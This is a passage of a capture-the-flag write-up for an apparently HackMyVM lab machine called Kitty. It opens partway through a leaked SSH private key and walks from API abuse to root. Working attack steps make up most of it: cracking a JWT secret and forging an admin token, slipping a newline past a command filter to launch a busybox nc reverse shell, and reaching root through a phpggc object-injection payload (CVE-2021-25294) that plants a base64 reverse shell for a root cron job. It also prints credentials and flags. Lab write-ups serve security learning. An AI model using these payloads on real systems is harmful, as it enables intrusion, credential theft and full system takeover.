meKqerJANjyPUtDf+jMt81wJRXF+jYL+Eez+s1o0dLiwThaO9svQ9g9OpNibaEzt\n3y4kws+MWU+jNz3NA0C+X/5GZeKRpURncAAADBANbbVAY1joRW27oxzKNjsxuYp81uEbsZ\n9UpavYL+eR7HFSjzk6qt4XD88L+y5G5tohog5iS6c4wr/pXfOIA3uWuSkdYSzWVYlOkfxC\nhFETtqdJAnfFGWpXc52lU151O1VI9rfCPfDvAjvsGxxcZpPUduGuP4KpdGfwJXYQqClhv4\nIv7yKjFG5VUvKq2qhcyS8zB3/ezloxdt/yVEfqGTm90pNeOlGLGEj8g95Q+aPgPharLlDQ\nhT8vaVsxulundRRQAAABNkeXV0aWRoYXJhQGZyZWU0YWxsAQIDBAUG\n-----END OPENSSH PRIVATE KEY-----"                                                                                  
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/-3'
{"Error":"-3 is Wrong Number. Try Again!"} 
```

Save `id_rsa` with correct format
```bash
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/-2' -s | py -c 'print(eval(input()))' > id_rsa.secret
```

No luck with SSH

We can also generate JWT tokens, I thought we had to hack admin value but it returned without issue.
```bash
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/user/login' --json '{"username": "nobody", "password": "74k3!7345y", "is_admin": 0}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzcxMDc0NDQwLjMwMzg2MX0.UEuZwdwLp46CMWgE-Hmb7Q0d2lOp68bsDTiazGmv6JY"}  

‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/user/login' --json '{"username": "nobody", "password": "74k3!7345y", "is_admin": 1}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzcxMDc0NDQyLjIxNjQxNDV9.0otuGJ2MwUKUiKHwsiUJJ7Ao4jZ79aRBsyaQ4CtKRk4"} 
```

The cake is a lie :D
```bash
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/secure/id' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzcxMDc0NDQyLjIxNjQxNDV9.0otuGJ2MwUKUiKHwsiUJJ7Ao4jZ79aRBsyaQ4CtKRk4'
{"Error":"You're Not Admin"} 
```

View payload
```bash
‚îî‚îÄ$ jwt_tool 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzcxMDc0NDQyLjIxNjQxNDV9.0otuGJ2MwUKUiKHwsiUJJ7Ao4jZ79aRBsyaQ4CtKRk4'
Token payload values:
[+] username = "nobody"
[+] is_admin = 0
[+] expires = 1771074442.2164145
```

Crack password
```bash
‚îî‚îÄ$ jwt_tool 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzcxMDc0NDQyLjIxNjQxNDV9.0otuGJ2MwUKUiKHwsiUJJ7Ao4jZ79aRBsyaQ4CtKRk4' -C -d /wordlists/rockyou.txt
...
[*] Tested 3 million passwords so far
[+] CORRECT key found: thispasswordismylittlesecret
```

Forge admin cookie
```bash
# Token is different because I generated it few more times
‚îî‚îÄ$ jwt_tool 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzcxMDc1Njk4LjE5OTgzNDZ9.sF-3fERdbyjvYheOsUNc-iT03dZjCeomx_2d1pUFpcU' -S hs256 -p 'thispasswordismylittlesecret' -I -pc username -pv admin -pc is_admin -pv 1
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cGlyZXMiOjE3NzEwNzU2OTguMTk5ODM0Nn0.9G9L2mwDYJ0lahsdIwsAFLs_pMQSLFWTthu3pTmAjzY
```

```bash
‚îî‚îÄ$ curl 'http://whythisapiissofast.kitty.hmv/api/v2/secure/id' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cGlyZXMiOjE3NzEwNzU2OTguMTk5ODM0Nn0.9G9L2mwDYJ0lahsdIwsAFLs_pMQSLFWTthu3pTmAjzY'
{"Error":"Wrong Command"} 
```

```bash
‚îî‚îÄ$ curl -H "$(cat cookie.txt)" 'http://whythisapiissofast.kitty.hmv/api/v2/secure/id'
{"Error":"Wrong Command"}

‚îî‚îÄ$ curl -H "$(cat cookie.txt)" 'http://whythisapiissofast.kitty.hmv/api/v2/secure/whoami'
{"Error":"Wrong Command"}

‚îî‚îÄ$ curl -H "$(cat cookie.txt)" 'http://whythisapiissofast.kitty.hmv/api/v2/secure/curl'
{"Error":"Wrong Command"}

‚îî‚îÄ$ curl -H "$(cat cookie.txt)" 'http://whythisapiissofast.kitty.hmv/api/v2/secure/wget'
{"Response":"wget command is working","want_source_code_?":"type ~source_code"} 
```

### RCE

```bash
‚îî‚îÄ$ curl -H "$(cat cookie.txt)" 'http://whythisapiissofast.kitty.hmv/api/v2/secure/~source_code' -s | py -c 'print(eval(input()))'
if re.search("wget", command):
	regex = re.compile('[@#$%&):(`}{;"'?|></]')
	if regex.search(command):
		return "You Can't Use Any Special Characters ----  Blocked Special Characters Are ==> [@#$%&):'(`}"{?;<>|/]
else:
	os.system(command)
```

Regex pattern has a "vulnerability", it's checking only single line. Insert newline and rest is not checked.
```bash
‚îî‚îÄ$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
---
‚îî‚îÄ$ curl -H "$(cat cookie.txt)" "http://whythisapiissofast.kitty.hmv/api/v2/secure/$(python3 -c 'import urllib.parse; print(urllib.parse.quote("wget 0\nbusybox nc 10.0.2.149 4444 -e bash"))')"
---
‚îî‚îÄ$ penelope -p 4444
www-data@kitty:/usr/local/src/FastAPI$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (dyutidhara)

```bash
www-data@kitty:~/cookie/config$ cat db.php
<?php

#define('DB_Server', 'localhost');
#define('DB_Username', 'root');
#define('DB_Password','root');
#define('DB_Name', 'Overflow');

$lnk = mysqli_connect("localhost","padding", "ihateyouadmin","padding");
$db = mysqli_select_db($lnk,"padding");
```

```bash
www-data@kitty:~/cookie/config$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
git:x:108:116:Git Version Control,,,:/home/git:/bin/bash
dyutidhara:x:1000:1000::/home/dyutidhara:/bin/bash
```

Now that username is available we can use SSH
```bash
‚îî‚îÄ$ ssh -i id_rsa.secret dyutidhara@kitty.hmv
dyutidhara@kitty:~$ id
uid=1000(dyutidhara) gid=1000(dyutidhara) groups=1000(dyutidhara)
```

### User.txt

```bash
dyutidhara@kitty:~$ cat user.txt
3702f4d1247163b61b1cd8b368539cbf
```

## Privilege Escalation (root)

More SQL creds
```bash
dyutidhara@kitty:/opt/opencats$ cat config.php  | grep define | grep DATABASE
define('DATABASE_USER', 'opencats');
	define('DATABASE_PASS', '0p3nc@75');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

Nothing in db, but there's a cronjob
```bash
dyutidhara@kitty:/opt/opencats$ cat /etc/crontab  | grep -v '#'
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
*  *  *  *  * root	  [ -f /usr/local/etc/newfile.txt ] && /usr/bin/sed -e 's/\[{"Expires":1,"Discard":false,"Value":"//' -e 's/\\n"}]//' /usr/local/etc/newfile.txt > /usr/local/etc/payload.txt | for i in $(/usr/bin/cat /usr/local/etc/payload.txt); do /usr/bin/echo $i | /usr/bin/base64 -d | /usr/bin/bash; done
...
```

```bash
if [ -f /usr/local/etc/newfile.txt ]; then
    sed -e 's/\[{"Expires":1,"Discard":false,"Value":"//' -e 's/\\n"}]//' /usr/local/etc/newfile.txt > /usr/local/etc/payload.txt
    for i in $(cat /usr/local/etc/payload.txt); do 
        echo $i | base64 -d | bash; 
    done
fi
```

Only `root` user and `power` group users can read/write from cronjob directory 
```bash
dyutidhara@kitty:/opt/opencats$ ls -alhd /usr/local/etc/
drwxrwx--- 2 root power 4.0K Mar 29  2022 /usr/local/etc/
```

Hmm
```bash
dyutidhara@kitty:/opt/opencats$ grep power /etc/group
power:x:1001:
dyutidhara@kitty:/opt/opencats$ grep power /etc/passwd
power:x:1001:1001::/nonexistent:/usr/sbin/nologin
dyutidhara@kitty:/opt/opencats$ find / -user power -ls 2>/dev/null
dyutidhara@kitty:/opt/opencats$ find / -group power -ls 2>/dev/null
   130010      4 drwxrwx---   2 root     power        4096 Mar 29  2022 /usr/local/etc
```

I thought the `opencats` was base domain, but it's another application
```bash
dyutidhara@kitty:/opt/opencats$ cat /etc/nginx/sites-available/opencats
server {
	listen 80;
	server_name thisisnotcatitisopencats.kitty.hmv;
	root /opt/opencats;
	index index.html index.htm index.php;
	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/run/php/power.sock; # <---
	}
}
```

Let's try poking this application. First add user to login
```bash
dyutidhara@kitty:/opt/opencats$ mysql -u'opencats' -p'0p3nc@75' 'opencats' -e "INSERT INTO user (site_id, user_name, password, access_level) VALUES (1, 'pwned', MD5('pwned'), 500);"
```

The application is vulnerable to Object Insertion which leads to RCE
- [CVE-2021-25294](https://nvd.nist.gov/vuln/detail/CVE-2021-25294)
- [OpenCATS PHP Object Injection to Arbitrary File Write](https://snoopysecurity.github.io/posts/09_opencats_php_object_injection/)

```bash
‚îî‚îÄ$ echo 'busybox nc 10.0.2.149 4444 -e /bin/bash' | base64 > newfile.txt
‚îî‚îÄ$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/newfile.txt $PWD/newfile.txt 2>/dev/null
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A57%3A%22YnVzeWJveCBuYyAxMC4wLjIuMTQ5IDQ0NDQgLWUgL2Jpbi9iYXNoCg%3D%3D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A26%3A%22%2Fusr%2Flocal%2Fetc%2Fnewfile.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

- [http://thisisnotcatitisopencats.kitty.hmv/index.php?m=activity&parametersactivity%3AActivityDataGrid=PAYLOAD_HERE](http://thisisnotcatitisopencats.kitty.hmv/index.php?m=activity&parametersactivity%3AActivityDataGrid=PAYLOAD_HERE)

After some time
```bash
[+] Got reverse shell from kitty~10.0.2.207-Linux-x86_64 üòçÔ∏è Assigned SessionID <3>
(Penelope)‚îÄ(Session [1])> sessions 3
root@kitty:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@kitty:~# cat /root/root.txt
3f798f4e70a832c64e8f6f1462b04d0f
```